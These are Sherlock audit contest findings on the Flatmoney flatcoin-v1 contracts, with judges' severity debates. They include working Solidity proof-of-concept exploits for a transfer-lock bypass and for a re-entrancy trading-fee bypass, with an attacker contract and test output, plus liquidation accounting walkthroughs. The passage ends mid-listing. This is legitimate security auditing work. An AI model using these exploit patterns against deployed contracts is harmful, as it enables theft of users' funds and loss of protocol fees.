# Issue H-1: The transfer lock for leveraged position orders can be bypassed 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/48 

## Found by 
0xVolodya, 0xvj, Bauer, HSP, cawfree, dany.armstrong90, evmboi32, jennifer37, juan, ke1caM, nobody2018, novaman33, r0ck3tz, shaka, takarez
## Summary

The leveraged positions can be closed either through [`DelayedOrder`](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L28-L681) or through the [`LimitOrder`](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LimitOrder.sol#L27-L214). Once the order is announced via `DelayedOrder.announceLeverageClose` or `LimitOrder.announceLimitOrder` function the `LeverageModule`'s `lock` function is called to prevent given token to be transferred. This mechanism can be bypassed and it is possible to unlock the token transfer while having order announced.

## Vulnerability Detail

Exploitation scenario:
1. Attacker announces leverage close order for his position via `announceLeverageClose` of `DelayedOrder` contract.
2. Attacker announces limit order via `announceLimitOrder` of `LimitOrder` contract.
3. Attacker cancels limit order via `cancelLimitOrder` of `LimitOrder` contract.
4. The position is getting unlocked while the leverage close announcement is active.
5. Attacker sells the leveraged position to a third party.
6. Attacker executes the leverage close via `executeOrder` of `DelayedOrder` contract and gets the underlying collateral stealing the funds from the third party that the leveraged position was sold to.

Following proof of concept presents the attack:
```solidity
function testExploitTransferOut() public {
    uint256 collateralPrice = 1000e8;

    vm.startPrank(alice);

    uint256 balance = WETH.balanceOf(alice);
    console2.log("alice balance", balance);
    
    (uint256 minFillPrice, ) = oracleModProxy.getPrice();

    // Announce order through delayed orders to lock tokenId
    delayedOrderProxy.announceLeverageClose(
        tokenId,
        minFillPrice - 100, // add some slippage
        mockKeeperFee.getKeeperFee()
    );
    
    // Announce limit order to lock tokenId
    limitOrderProxy.announceLimitOrder({
        tokenId: tokenId,
        priceLowerThreshold: 900e18,
        priceUpperThreshold: 1100e18
    });
    
    // Cancel limit order to unlock tokenId
    limitOrderProxy.cancelLimitOrder(tokenId);
    
    balance = WETH.balanceOf(alice);
    console2.log("alice after creating two orders", balance);

    // TokenId is unlocked and can be transferred while the delayed order is active
    leverageModProxy.transferFrom(alice, address(0x1), tokenId);
    console2.log("new owner of position NFT", leverageModProxy.ownerOf(tokenId));

    balance = WETH.balanceOf(alice);
    console2.log("alice after transfering position NFT out e.g. selling", balance);

    skip(uint256(vaultProxy.minExecutabilityAge())); // must reach minimum executability time

    uint256 oraclePrice = collateralPrice;

    bytes[] memory priceUpdateData = getPriceUpdateData(oraclePrice);
    delayedOrderProxy.executeOrder{value: 1}(alice, priceUpdateData);

    uint256 finalBalance = WETH.balanceOf(alice);
    console2.log("alice after executing delayerd order and cashing out profit", finalBalance);
    console2.log("profit", finalBalance - balance);
}
```

Output
```shell
Running 1 test for test/unit/Common/LimitOrder.t.sol:LimitOrderTest
[PASS] testExploitTransferOut() (gas: 743262)
Logs:
  alice balance 99879997000000000000000
  alice after creating two orders 99879997000000000000000
  new owner of position NFT 0x0000000000000000000000000000000000000001
  alice after transfering position NFT out e.g. selling 99879997000000000000000
  alice after executing delayerd order and cashing out profit 99889997000000000000000
  profit 10000000000000000000

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 50.06ms

Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

## Impact

The attacker can sell the leveraged position with a close order opened, execute the order afterward, and steal the underlying collateral.

## Code Snippet
- https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L298
- https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LimitOrder.sol#L76
- https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LimitOrder.sol#L94

## Tool used

Manual Review

## Recommendation

It is recommended to prevent announcing order either through `DelayedOrder.announceLeverageClose` or `LimitOrder.announceLimitOrder` if the leveraged position is already locked.



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  invalid: i believe features that are meant for the future is out-of scope and thus selling feature falls into that; user can only transfer the nft now; nothing sort of selling; so no collateral fraud here.



**0xLogos**

Escalate 

Invalid, it's user mistake to buy such position

**sherlock-admin2**

> Escalate 
> 
> Invalid, it's user mistake to buy such position

You've created a valid escalation!

To remove the escalation from consideration: Delete your comment.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**novaman33**

> Escalate 
> 
> 
> 
> Invalid, it's user mistake to buy such position

Then if it is a user mistake the whole lock is unnecessary?

**r0ck3tzx**

The token is supposed to be tradable which was also confirmed by the sponsor:
<img width="519" alt="proof" src="https://github.com/sherlock-audit/2023-12-flatmoney-judging/assets/150954229/0452d3db-d003-484e-ac43-6c11c186bae7">

That means it cannot be treated as user mistake if you can sell the token and then steal underlying value.


**0xLogos**

If trustless trade is desired parties must use some contract to facilitate atomic swap. For example NFT market place, but to exploit it attacker must somehow frontrun buying tx to announce order before, but it's impossible. Note that delayed orders expire in minutes. 
If atomic swap not used parties already trust each other.

I believe it's really hard to realisticly exploit it and this should be low because attacker can't just "sell" position. It's not like art nft when underlying "value" is static. Here buyer choose to buy or not and it's his obligation to check announced orders just like checking position PnL.

Also transferable != tradable

**r0ck3tzx**

Half of the protocol is the locking mechanism so its clear it is not supposed to be transferred. Its the same as you would transfer ERC721 without resetting approvals. I won't comment further on this, as you've escalated most of the issues, throwing mud and seeing what sticks. I don't have time for dealing with this.

**xiaoming9090**

Escalate.

This issue does not lead to loss of assets for the protocol or the protocol's users. It does not drain the assets within the protocol or steal the assets that Flatcoin's LPs/Long Traders deposit into the protocol. The only affected parties are external or third parties (not related to the protocol in any sense) who are being tricked into buying such position NFTs outside of the protocol border. Thus, it does not meet the requirement of a Med/High where the assets of the protocol and the protocol's users can be stolen. 

Low is a more appropriate category for such an issue.

**sherlock-admin2**

> Escalate.
> 
> This issue does not lead to loss of assets for the protocol or the protocol's users. It does not drain the assets within the protocol or steal the assets that Flatcoin's LPs/Long Traders deposit into the protocol. The only affected parties are external or third parties (not related to the protocol in any sense) who are being tricked into buying such position NFTs outside of the protocol border. Thus, it does not meet the requirement of a Med/High where the assets of the protocol and the protocol's users can be stolen. 
> 
> Low is a more appropriate category for such an issue.

You've created a valid escalation!

To remove the escalation from consideration: Delete your comment.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**ABDuullahi**

I believe this issue should be invalid.

The report has been tailored on the fact that the NFTs can be traded and the impact also is that when a user buys the position, there isn't anything sort of selling, thats for users to deal with, the sponsor confirm that there might be a feature that will allow that position(NFT) to be used as a collateral but that isn't of our concern in this case. Other issues demonstrating the NFT being transferred should stay valid due to the fact that they aren't meant to, and thus breaking a core invariant of the protocol.

**r0ck3tzx**

The user who purchases the position becomes a user of the protocol. The affected party is then a user of the protocol holding a malicious position from which the attacker can steal funds. To render this issue invalid, it would be required to show that the position (ERC721) holds no value which is false.

@ABDuullahi let me understand correctly, you are claiming that this specific report that presents the whole attack scenario with PoC should be invalidated, but the others that are saying it breaks the invariant should be valid?

**sherlock-admin**

The protocol team fixed this issue in PR/commit https://github.com/dhedge/flatcoin-v1/pull/278.

**nevillehuang**

I believe this issue should remain as valid, given 

- It is [explicitly mentioned that the token is locked](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L296) when an order is announced, so it is implied that it should remain locked.

- Tokens are supposed to be traded and is public knowledge mentioned by sponsor as noted by this [comment](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/48#issuecomment-1956245750)

**Czar102**

So, a locked position can have an action queued that will grant a fraction (potentially all) tokens within the position to the past owner? And this action will be executed after the sale happens? @nevillehuang @r0ck3tzx @0xLogos

If that's the case, the buyer should have checked that the position has no pending withdrawals.

**r0ck3tzx**

@Czar102 The position can be transferred/traded freely. When user decides to close the position he can either do that via `announceLeverageClose` or `announceLimitOrder`. Once the order is announced the position is locked and it should not be transferred/traded in any way. This logic of locking position takes significant portion of the codebase.

The issue is pretty much connected to two things:
- Breaking one of the core invariants of the protocol.
- Ability to pull up the attack of selling position for which order is announced and can be executed which allows to steal not portion but ALL underlying tokens of the position.

I cannot agree that the buyer should have checked for that - this case is very similar to ERC721 where upon transfers [the approval is cleared](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/8b4b7b8d041c62a84e2c23d7f6e1f0d9e0fc1f20/contracts/token/ERC721/ERC721.sol#L251-L252). You could argue that every buyer of NFT should check first if the approval was cleared out but obviously that would make NFTs unusable and nobody would trade them.

**nevillehuang**

Agree with @r0ck3tzx comments, also to note normally, this type of finding would likely be invalid as it would entail out of scope secondary market exchanges between the buyer and seller of the NFT. However, as noted by my comment [here](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/48#issuecomment-1961032374), it is implied that the lock should persist, so a honeypot attack shouldn't be possible. 

**Czar102**

What's the main goal of having the lock functionality?

**0xjuaan**

it prevents people from transferring the nft while an order is pending for that nft's tokenId

**Czar102**

Understood, but is it expressed anywhere what is it for?

**novaman33**

@Czar102 https://discord.com/channels/812037309376495636/1199005620536356874/1202201279817072691

**xiaoming9090**

> @Czar102 https://discord.com/channels/812037309376495636/1199005620536356874/1202201279817072691

The sponsor mentioned, "**If** our NFT was integrated in other protocols", would that be considered a future issue under Sherlock rule since it is still unsure at this point if their NFT will be integrated with other protocols?

**0xcrunch**

I believe sponsor was actually demonstrating that the lock functionality is very important and any related issue is unacceptable.

**r0ck3tzx**

@Czar102 
> What's the main goal of having the lock functionality?

When you have an position and you want to close it, the locking functionality ensures that you are not transferring/trading it. You shouldnt be able to sell something you dont own.

> Understood, but is it expressed anywhere what is it for?

Are we going now towards a direction of expecting sponsors to write a book about every line of the protocol so the LSW cannot start his "legal" battle? We are literally now wasting time on proving that the man is not a camel.

@xiaoming9090 
> > @Czar102 https://discord.com/channels/812037309376495636/1199005620536356874/1202201279817072691
> 
> The sponsor mentioned, "**If** our NFT was integrated in other protocols", would that be considered a future issue under Sherlock rule since it is still unsure at this point if their NFT will be integrated with other protocols?

Its absolutely disgusting how LSW again is twisting the words and confusing the judges. That way every issue related to protocol own tokens should be invalid, because their value depends on the future integration with DEX such as Uniswap.


**Czar102**

I think the intention of the smart contracts working with exchanges (that's the goal of the lock functionality) is extremely clear, so the inability to arbitrarily unlock is an extremely property that breaks planned (not future!) integrations.

Hence, I think this issue should maintain its validity and severity.

**Evert0x**

Result: 
High
Has Duplicates

**sherlock-admin2**

Escalations have been resolved successfully!

Escalation status:
- [0xLogos](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/48/#issuecomment-1956083894): rejected
- [xiaoming9090](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/48/#issuecomment-1959556662): rejected

# Issue H-2: A malicious user can bypass limit order trading fees via cross-function re-entrancy 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/75 

## Found by 
LTDingZhen, juan, nobody2018, r0ck3tz
## Summary
A malicious user can bypass limit order trading fees via cross-function re-entrancy, since `_safeMint` makes an external call to the user before updating state.

## Vulnerability Detail
In the `LeverageModule` contract, the `_mint` function calls `_safeMint`, which makes an external call to the receiver of the NFT (the `to` address).

<details>
<summary>LeverageModule::_mint()</summary>

```javascript
function _mint(address _to) internal returns (uint256 _tokenId) {
        _tokenId = tokenIdNext;

        _safeMint(_to, tokenIdNext);

        tokenIdNext += 1;
}
```
</details>

Only after this external call, `vault.setPosition()` is called to create the new position in the vault's storage mapping. This means that an attacker can gain control of the execution while the state of  `_positions[_tokenId]` in FlatcoinVault is not up-to-date.

<details>

<summary>LeverageModule::executeOpen()</summary>

```javascript
_newTokenId = _mint(_account); // Here, an attack gains control of execution

vault.setPosition( // This updates _positions[_tokenId] in the FlatcoinVault, but after the external call
    FlatcoinStructs.Position({
        lastPrice: entryPrice,
        marginDeposited: announcedOpen.margin,
        additionalSize: announcedOpen.additionalSize,
        entryCumulativeFunding: vault.cumulativeFundingRate()
    }),
    _newTokenId
);
```

> Permalink: https://github.com/sherlock-audit/2023-12-flatmoney/blob/bba4f077a64f43fbd565f8983388d0e985cb85db/flatcoin-v1/src/LeverageModule.sol#L111-L121

</details>

This outdated state of `_positions[_tokenId]` can be exploited by an attacker once the external call has been made. They can re-enter `LimitOrder::announceLimitOrder()` and provide the tokenId that has just been minted.
In that function, the trading fee is calculated as follows:

```javascript
uint256 tradeFee = ILeverageModule(vault.moduleAddress(FlatcoinModuleKeys._LEVERAGE_MODULE_KEY)).getTradeFee(
    vault.getPosition(tokenId).additionalSize
);
```
However since the position has not been created yet (due to state being updated after an external call), this results in the `tradeFee` being 0 since `vault.getPosition(tokenId).additionalSize` returns the default value of a uint256 (0), and `tradeFee` = fee * size.

Hence, when the limit order is executed, the trading fee (`tradeFee`) charged to the user will be `0`.

## Impact
A malicious user can bypass the trading fees for a limit order, via cross-function re-entrancy. These trading fees were supposed to be paid to the LPs by increasing `stableCollateralTotal`, but due to limit orders being able to bypass trading fees (albeit during the same transaction as opening the position), LPs are now less incentivised to provide their liquidity to the protocol.

## Code Snippet
https://github.com/sherlock-audit/2023-12-flatmoney/blob/bba4f077a64f43fbd565f8983388d0e985cb85db/flatcoin-v1/src/LeverageModule.sol#L111-L121

## Proof of Concept
Summary:
1. A user announces opening a leverage position, calling announceLeverageOpen() via a smart contract which implements `IERC721Receiver`.
2. Once the keeper executes the order, the contract is called, with the function `onERC721Received(address,address,uint256,bytes)`
3. The function calls `LimitOrder::announceLimitOrder()` to create the desired limit order to close the position. (stop loss, take profit levels)
4. The contract then returns `msg.sig` (the function signature of the executing function) to satify the `IERC721Receiver`'s requirement.

To run this proof of concept:
1. Add 2 files `AttackerContract.sol` and `ReentrancyPoC.t.sol` to `flatcoin-v1/test/unit` in the project's repo.
2. run `forge test --mt test_tradingFeeBypass -vv` in the terminal

<details><summary>Attacker Contract</summary>

```javascript
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.18;

import {OrderHelpers} from "../helpers/OrderHelpers.sol";
import {FlatcoinStructs} from "../../src/libraries/FlatcoinStructs.sol";
import "forge-std/console2.sol";
import {Setup} from "../helpers/Setup.sol";
import {LimitOrder} from "src/LimitOrder.sol";

contract AttackerContract {

    LimitOrder limitOrderProxy;

    function setLimitOrderProxy(address limitOrderAddress) external {
        limitOrderProxy = LimitOrder(limitOrderAddress);
    }
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns(bytes4) {
        // Do the cross-function re-entrancy
        limitOrderProxy.announceLimitOrder(tokenId, 750e18, 1250e18);

        // Return the function signature (required by the standard)
        return msg.sig;
        // Note: Also could return `this.onERC721Received.selector` or `bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"))`
    }
}
```
</details>

<details>
<summary>Proof of Concept (Foundry Test)</summary>

```javascript
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.18;

import {OrderHelpers} from "../helpers/OrderHelpers.sol";
import {FlatcoinStructs} from "../../src/libraries/FlatcoinStructs.sol";
import "forge-std/console2.sol";
import {AttackerContract} from "./AttackerContract.sol";
import {Setup} from "../helpers/Setup.sol";

contract ReentrancyPoC is Setup, OrderHelpers {
    function test_tradingFeeBypass() public {
        
        // Set up and initialize the attacker's contract
        AttackerContract attackerContract = new AttackerContract();
        attackerContract.setLimitOrderProxy(address(limitOrderProxy));

        // Deal the exploiter contract with WETH + ETH
        deal(address(WETH), address(attackerContract), 100_000e18); // Loading account with `token`.
        deal(address(attackerContract), 100_000e18); // Loading account with native token.

        uint256 aliceBalanceBefore = WETH.balanceOf(alice);
        uint256 stableDeposit = 100e18;
        uint256 collateralPrice = 1000e8;

        // Alice provides liquidity
        vm.startPrank(alice);
        announceAndExecuteDeposit({
            traderAccount: alice,
            keeperAccount: keeper,
            depositAmount: stableDeposit,
            oraclePrice: collateralPrice,
            keeperFeeAmount: 0
        });
        vm.stopPrank();

        // Contract opens position: 10 ETH collateral, 30 ETH additional size (4x leverage)
        uint256 tokenId = announceAndExecuteLeverageOpen({
            traderAccount: address(attackerContract),
            keeperAccount: keeper,
            margin: 10e18,
            additionalSize: 30e18,
            oraclePrice: collateralPrice,
            keeperFeeAmount: 0
        });

        // Get the limit order that has been created by the attacker's contract
        FlatcoinStructs.Order memory limitOrderCreated = limitOrderProxy.getLimitOrder(tokenId);

        // Get the order's data
        FlatcoinStructs.LimitClose memory orderData = abi.decode(limitOrderCreated.orderData, (FlatcoinStructs.LimitClose));
        
        ///////////////////////
        // POC Assertions    //
        ///////////////////////
        // Assert that the tradeFee for the limit order is 0
        assertEq(orderData.tradeFee, 0);

        // Assert that the price threshold is 750e18, showing that it is not zero, showing that the orderData is not just returning the default values.
        assertEq(orderData.priceLowerThreshold, 750e18);


        ///////////////////////
        // Other Assertions  //
        ///////////////////////
        // The following assertions are copied from another test in the test suite-

        // ERC721 token assertions:
        {
            (uint256 buyPrice, ) = oracleModProxy.getPrice();
            // Position 0:
            FlatcoinStructs.Position memory position0 = vaultProxy.getPosition(tokenId);
            assertEq(position0.lastPrice, buyPrice, "Entry price is not correct");
            assertEq(position0.marginDeposited, 10e18, "Margin deposited is not correct");
            assertEq(position0.additionalSize, 30e18, "Size is not correct");
            assertEq(tokenId, 0, "Token ID is not correct");
        }
        // PnL assertions:
        {
            FlatcoinStructs.PositionSummary memory positionSummary0 = leverageModProxy.getPositionSummary(tokenId);
            uint256 collateralPerShareBefore = stableModProxy.stableCollateralPerShare();

            // Check that before the WETH price change, there is no profit or loss change
            assertEq(positionSummary0.profitLoss, 0, "Pnl for user 0 is not correct");
            assertEq(
                positionSummary0.marginAfterSettlement,
                10e18,
                "Margin after settlement for user 0 is not correct"
            ); // full margin available
        }
    }  
}
```

</details>

<details>
<summary> Console Output </summary>

```powershell
Running 1 test for test/unit/ReentrancyPoC.t.sol:ReentrancyPoC
[PASS] test_tradingFeeBypass() (gas: 2006498)
Logs:
  tradeFee: 0

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.81ms
 
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

</details>

## Tool used
Manual Review

## Recommendation
To fix this specific issue, the following change is sufficient:
```diff
-_newTokenId = _mint(_account); 

vault.setPosition( 
    FlatcoinStructs.Position({
        lastPrice: entryPrice,
        marginDeposited: announcedOpen.margin,
        additionalSize: announcedOpen.additionalSize,
        entryCumulativeFunding: vault.cumulativeFundingRate()
    }),
-   _newTokenId
+   tokenIdNext
);
+_newTokenId = _mint(_account); 
``` 
However there are still more state changes that would occur after the `_mint` function (potentially yielding other cross-function re-entrancy if the other contracts were changed) so the optimum solution would be to mint the NFT after all state changes have been executed, so the safest solution would be to move `_mint` all the way to the end of `LeverageModule::executeOpen()`.

Otherwise, if changing this order of operations is undesirable for whatever reason, one can implement the following check within `LimitOrder::announceLimitOrder()` to ensure that the `positions[_tokenId]` is not uninitialized:

```diff
uint256 tradeFee = ILeverageModule(vault.moduleAddress(FlatcoinModuleKeys._LEVERAGE_MODULE_KEY)).getTradeFee(
    vault.getPosition(tokenId).additionalSize
);

+require(additionalSize > 0, "Additional Size of a position cannot be zero");

```



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  valid: medium finding as there is no profit in doing so; user closed position immediately after opening it; medium(5)



**ydspa**

Escalate

Fee loss in certain circumstance is a Medium issue

**sherlock-admin2**

> Escalate
> 
> Fee loss in certain circumstance is a Medium issue

You've created a valid escalation!

To remove the escalation from consideration: Delete your comment.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**securitygrid**

The tradeFee of an order may be relatively small, but imagine that the accumulated tradeFee of high-frequency trading or a large number of orders will be small?

**r0ck3tzx**

The severity should be high, as it is easy to create a separate service that could enable the opening of leverage positions with limit orders (stop loss and take profit) at a 0 trade fee, allowing the siphoning of value from the Flat Money protocol at scale.



**0xLogos**

Escalate

Dup of #212 bcz same root cause: fee must be calculated at execution time of the limit order

**sherlock-admin2**

> Escalate
> 
> Dup of #212 bcz same root cause: fee must be calculated at execution time of the limit order

You've created a valid escalation!

To remove the escalation from consideration: Delete your comment.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**r0ck3tzx**

> Escalate
> 
> Dup of #212 bcz same root cause: fee must be calculated at execution time of the limit order

Its not the same root cause, the root cause of this is the update of state `setPosition` that happens after the minting process that allows hijacking the execution.

**xiaoming9090**

Escalate.

The impact of this issue is that the LPs will not receive the trade fee. This is similar to other issues where the protocol did not receive their entitled trade fee due to some error and should be categorized as loss of fee OR loss of earning, and thus should be a Medium. 

Also, note that the LPs gain/earn when the following event happens:

- Loss of the long trader. This is because LP is the short side. The loss of a long trader is the gain of a short trader.
- Open, adjust, close long position - (0.1% fee)
- Open limit order - (0.1% fee)
- Borrow Rate Fees (aka Funding Rate)
- Liquidation Fees
- ETH Staking Yield

Statically, the bulk of the LP gain comes from the loss of the long trader in such a long-short prep protocol in the real world. The uncollected trading fee due to certain malicious users opening limit orders only makes up a very small portion of the earnings and does not materially impact the LPs or protocols. Also, this is not a bug that would drain the protocol, directly steal the assets of LPs, or lead to the protocol being insolvent. Thus, this issue should not be High. A risk rating of Medium would be more appropriate in this case.

**sherlock-admin2**

> Escalate.
> 
> The impact of this issue is that the LPs will not receive the trade fee. This is similar to other issues where the protocol did not receive their entitled trade fee due to some error and should be categorized as loss of fee OR loss of earning, and thus should be a Medium. 
> 
> Also, note that the LPs gain/earn when the following event happens:
> 
> - Loss of the long trader. This is because LP is the short side. The loss of a long trader is the gain of a short trader.
> - Open, adjust, close long position - (0.1% fee)
> - Open limit order - (0.1% fee)
> 
> Statically, the bulk of the LP gain comes from the loss of the long trader in such a long-short prep protocol in the real world. The uncollected trading fee due to certain malicious users opening limit orders only makes up a very small portion of the earnings and does not materially impact the LPs or protocols. Also, this is not a bug that would drain the protocol, directly steal the assets of LPs, or lead to the protocol being insolvent. Thus, this issue should not be High. A risk rating of Medium would be more appropriate in this case.

You've created a valid escalation!

To remove the escalation from consideration: Delete your comment.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**sherlock-admin**

The protocol team fixed this issue in PR/commit https://github.com/dhedge/flatcoin-v1/pull/279.

**securitygrid**

The root cause of reentrancy is that the CEI pattern is not applied, and bypassing tradeFee is just an attack method. This issue is not a Dup of #212. Different roots, different fixes.
The tradeFee is given to the short side, which means a loss of funds for them.



**nevillehuang**

Agree, this has separate root causes as #212. I have a similar stance for this issue based on my comment [here](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/212#issuecomment-1960994558).

**Czar102**

I think High severity is appropriate, see https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/212#issuecomment-1967232859.

I believe the root causes and fixes are different, so supported by @nevillehuang's expertise, planning not to duplicate these issues.

Planning to reject the escalations and leave the issue as is.

**Czar102**

Result:
High
Has duplicates

**sherlock-admin2**

Escalations have been resolved successfully!

Escalation status:
- [ydspa](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/75/#issuecomment-1955908637): rejected
- [0xLogos](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/75/#issuecomment-1957729031): rejected
- [xiaoming9090](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/75/#issuecomment-1959560417): rejected

# Issue H-3: Incorrect handling of PnL during liquidation 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/180 

## Found by 
santipu\_, xiaoming90
## Summary

The incorrect handling of PnL during liquidation led to an error in the protocol's accounting mechanism, which might result in various issues, such as the loss of assets and the stable collateral total being inflated.

## Vulnerability Detail

#### First Example

Assume a long position with the following state:

- Margin Deposited = +20
- Accrued Funding = -100
- Profit & Loss (PnL) = +100
- Liquidation Margin = 30
- Liquidation Fee = 25
- Settled Margin = Margin Deposited + Accrued Funding + PnL = 20

Let the current `StableCollateralTotal` be $x$ and `marginDepositedTotal` be $y$ at the start of the liquidation.

Firstly, the `settleFundingFees()` function will be executed at the start of the liquidation process. The effect of the `settleFundingFees()` function is shown below. The long trader's `marginDepositedTotal` will be reduced by 100, while the LP's `stableCollateralTotal` will increase by 100.

```solidity
settleFundingFees() = Short/LP need to pay Long 100

marginDepositedTotal = marginDepositedTotal + funding fee
marginDepositedTotal = y + (-100) = (y - 100)

stableCollateralTotal = x + (-(-100)) = (x + 100)
```

Since the position's settle margin is below the liquidation margin, the position will be liquidated.

At Line 109, the condition `(settledMargin > 0)` will be evaluated as `True`. At Line 123:

```solidity
if (uint256(settledMargin) > expectedLiquidationFee)
if (+20 > +25) => False
liquidatorFee = settledMargin
liquidatorFee = +20
```

The `liquidationFee` will be to +20 at Line 127 below. This basically means that all the remaining margin of 20 will be given to the liquidator, and there should be no remaining margin for the LPs.

At Line 133 below, the `vault.updateStableCollateralTotal` function will be executed:

```solidity
vault.updateStableCollateralTotal(remainingMargin - positionSummary.profitLoss);
vault.updateStableCollateralTotal(0 - (+100));
vault.updateStableCollateralTotal(-100);

stableCollateralTotal = (x + 100) - 100 = x
```

When `vault.updateStableCollateralTotal` is set to `-100`, `stableCollateralTotal` is equal to $x$.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LiquidationModule.sol#L85

```solidity
File: LiquidationModule.sol
085:     function liquidate(uint256 tokenId) public nonReentrant whenNotPaused liquidationInvariantChecks(vault, tokenId) {
..SNIP..
102:         // Check that the total margin deposited by the long traders is not -ve.
103:         // To get this amount, we will have to account for the PnL and funding fees accrued.
104:         int256 settledMargin = positionSummary.marginAfterSettlement;
105: 
106:         uint256 liquidatorFee;
107: 
108:         // If the settled margin is greater than 0, send a portion (or all) of the margin to the liquidator and LPs.
109:         if (settledMargin > 0) {
110:             // Calculate the liquidation fees to be sent to the caller.
111:             uint256 expectedLiquidationFee = PerpMath._liquidationFee(
112:                 position.additionalSize,
113:                 liquidationFeeRatio,
114:                 liquidationFeeLowerBound,
115:                 liquidationFeeUpperBound,
116:                 currentPrice
117:             );
118: 
119:             uint256 remainingMargin;
120: 
121:             // Calculate the remaining margin after accounting for liquidation fees.
122:             // If the settled margin is less than the liquidation fee, then the liquidator fee is the settled margin.
123:             if (uint256(settledMargin) > expectedLiquidationFee) {
124:                 liquidatorFee = expectedLiquidationFee;
125:                 remainingMargin = uint256(settledMargin) - expectedLiquidationFee;
126:             } else {
127:                 liquidatorFee = uint256(settledMargin);
128:             }
129: 
130:             // Adjust the stable collateral total to account for user's remaining margin.
131:             // If the remaining margin is greater than 0, this goes to the LPs.
132:             // Note that {`remainingMargin` - `profitLoss`} is the same as {`marginDeposited` + `accruedFunding`}.
133:             vault.updateStableCollateralTotal(int256(remainingMargin) - positionSummary.profitLoss);
134: 
135:             // Send the liquidator fee to the caller of the function.
136:             // If the liquidation fee is greater than the remaining margin, then send the remaining margin.
137:             vault.sendCollateral(msg.sender, liquidatorFee);
138:         } else {
139:             // If the settled margin is -ve then the LPs have to bear the cost.
140:             // Adjust the stable collateral total to account for user's profit/loss and the negative margin.
141:             // Note: We are adding `settledMargin` and `profitLoss` instead of subtracting because of their sign (which will be -ve).
142:             vault.updateStableCollateralTotal(settledMargin - positionSummary.profitLoss);
143:         }
```

Next, the `vault.updateGlobalPositionData` function [here](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LiquidationModule.sol#L159) will be executed.

```solidity
vault.updateGlobalPositionData({marginDelta: -(position.marginDeposited + positionSummary.accruedFunding)})
vault.updateGlobalPositionData({marginDelta: -(20 + (-100))})
vault.updateGlobalPositionData({marginDelta: 80})

profitLossTotal = 100
newMarginDepositedTotal = globalPositions.marginDepositedTotal + marginDelta + profitLossTotal
newMarginDepositedTotal = (y - 100) + 80 + 100 = (y + 80)

stableCollateralTotal = stableCollateralTotal + -PnL
stableCollateralTotal = x + (-100) = (x - 100)
```

The final `newMarginDepositedTotal` is $y + 80$ and `stableCollateralTotal` is $x -100$, which is incorrect. In this scenario

- There is no remaining margin for the LPs, as all the remaining margin has been sent to the liquidator as a fee. The remaining margin (settled margin) is also not negative. Thus, there should not be any loss on the `stableCollateralTotal`. The correct final `stableCollateralTotal` should be $x$.
- The final `newMarginDepositedTotal` is $y + 80$, which is incorrect as this indicates that the long trader's pool has gained 80 ETH, which should not be the case when a long position is being liquidated.

#### Second Example

The current price of rETH is \$1000.

Let's say there is a user A (Alice) who makes a deposit of 5 rETH as collateral for LP.

Let's say another user, Bob (B), comes up, deposits 2 rETH as a margin, and creates a position with a size of 5 rETH, basically creating a perfectly hedged market. Since this is a perfectly hedged market, the accrued funding fee will be zero for the context of this example.

Total collateral in the system = 5 rETH + 2 rETH = 7 rETH

After some time, the price of rETH drop to \$500. As a result, Bob's position is liquidated as its settled margin is less than zero.

$$
settleMargin = 2\  rETH + \frac{5 \times (500 - 1000)}{500}
= 2\ rETH - 5\ rETH = -3\ rETH
$$

During the liquidation, the following code is executed to update the LP's stable collateral total:

```solidity
vault.updateStableCollateralTotal(settledMargin - positionSummary.profitLoss);
vault.updateStableCollateralTotal(-3 rETH - (-5 rETH));
vault.updateStableCollateralTotal(+2);
```

LP's stable collateral total increased by 2 rETH.

Subsequently, the `updateGlobalPositionData` function will be executed.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LiquidationModule.sol#L159

```solidity
File: LiquidationModule.sol
85:     function liquidate(uint256 tokenId) public nonReentrant whenNotPaused liquidationInvariantChecks(vault, tokenId) {
..SNIP..
159:         vault.updateGlobalPositionData({
160:             price: position.lastPrice,
161:             marginDelta: -(int256(position.marginDeposited) + positionSummary.accruedFunding),
